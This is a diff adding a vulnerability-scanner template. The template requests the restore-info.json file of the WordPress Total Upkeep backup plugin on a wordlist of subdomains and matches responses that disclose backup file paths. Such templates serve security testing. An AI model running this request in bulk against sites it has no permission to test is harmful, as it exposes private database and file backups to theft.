@@ -1,0 +1,34 @@
+id: wordpress-total-upkeep-backup-download
+info:
+  name: WordPress Total Upkeep Database and Files Backup Download
+  author: princechaddha
+  severity: high
+  reference: https://www.exploit-db.com/exploits/49252
+  tags: wordpress,wp-plugin
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+    raw:
+      - |
+        GET /wp-content/plugins/boldgrid-backup/cron/restore-info.json HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: word
+        words:
+          - '"filepath"'
+          - '/wp-content/boldgrid_backup_'
+        condition: and
+        part: body
+      - type: status
+        status:
+          - 200
